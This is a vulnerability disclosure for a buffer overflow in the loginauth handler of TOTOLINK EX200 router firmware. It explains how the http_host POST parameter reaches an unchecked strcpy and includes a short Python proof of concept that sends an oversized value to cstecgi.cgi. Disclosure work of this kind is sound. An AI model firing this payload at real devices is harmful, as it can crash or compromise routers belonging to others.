## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/data/upload/20210428/7979e841521515eb83b45aacf5b67f9a.zip

## Affected version

EX200 V4.0.3c.7646_B20201211

## Vulnerability details

In the EX200 V4.0.3c.7646_B20201211 firmware has a buffer overflow vulnerability in the `loginauth` function. The `v8` variable receives the `http_host` parameter from a POST request. However, since the user can control the input of `http_host`, the statement `strcpy(v26, v8);` can cause a buffer overflow vulnerability.

![image-20240719101917489](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719101917489.png)

![image-20240719101821295](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719101821295.png)

![image-20240719101834445](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719101834445.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"username":"admin","password":"admin","http_host":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","verify":"0","flag":"0","topicurl":"loginAuth"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240720235644369](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240720235644369.png)
